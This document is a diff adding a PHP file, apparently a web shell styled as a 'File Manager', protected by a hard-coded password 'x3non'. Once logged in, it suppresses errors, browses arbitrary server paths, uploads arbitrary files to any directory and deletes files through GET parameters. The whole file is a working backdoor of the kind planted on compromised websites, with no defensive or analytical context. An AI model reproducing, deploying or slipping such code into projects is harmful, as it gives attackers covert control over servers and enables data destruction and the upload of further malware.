@@ -1,0 +1,33 @@
+<?php
+@error_reporting(0);
+@ini_set('display_errors', 0);
+session_start();
+$auth = "x3non"; // Change password
+if (!isset($_SESSION['auth'])) {
+    if (isset($_POST['pass']) && $_POST['pass'] === $auth) {
+        $_SESSION['auth'] = true;
+    } else {
+        echo "<form method='POST'><input type='password' name='pass'><input type='submit'></form>";
+        exit;
+    }
+}
+$cwd = getcwd();
+if (isset($_GET['path'])) $cwd = $_GET['path'];
+if (isset($_FILES['f'])) {
+    move_uploaded_file($_FILES['f']['tmp_name'], $cwd.'/'.$_FILES['f']['name']);
+}
+if (isset($_GET['del'])) {
+    unlink($_GET['del']);
+}
+echo "<style>body{background:#111;color:#0f0;font-family:monospace}a{color:#0ff;text-decoration:none}</style>";
+echo "<h1>File Manager</h1><form method='POST' enctype='multipart/form-data'>
+<input type='file' name='f'><input type='submit' value='Upload'></form><hr>";
+$files = scandir($cwd);
+foreach ($files as $f) {
+    if ($f === ".") continue;
+    $path = "$cwd/$f";
+    echo "<a href='?path=".urlencode($path)."'>$f</a> ";
+    if (is_file($path)) echo " - <a href='?del=".urlencode($path)."'>[Delete]</a>";
+    echo "<br>";
+}
+?>
